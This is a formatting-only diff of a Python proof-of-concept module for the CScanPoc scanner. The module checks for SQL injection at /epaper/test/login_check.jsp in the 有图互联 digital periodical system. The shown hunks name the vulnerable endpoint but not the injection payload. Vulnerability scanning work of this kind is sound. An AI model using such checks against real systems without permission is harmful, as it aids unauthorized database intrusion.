@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Uniflows_0001'  # 平台漏洞编号，留空
     name = '有图互联数字期刊系统 报错注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         有图互联数字期刊系统 /epaper/test/login_check.jsp 参数处理不当，导致SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '有图互联'  # 漏洞应用名称
     product_version = '有图互联数字期刊系统'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '8e2f13c1-7283-4c26-8a6c-3b887c4c54d3'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #ref http://www.wooyun.org/bugs/wooyun-2010-0138987
+            # ref http://www.wooyun.org/bugs/wooyun-2010-0138987
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + '/epaper/test/login_check.jsp'
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
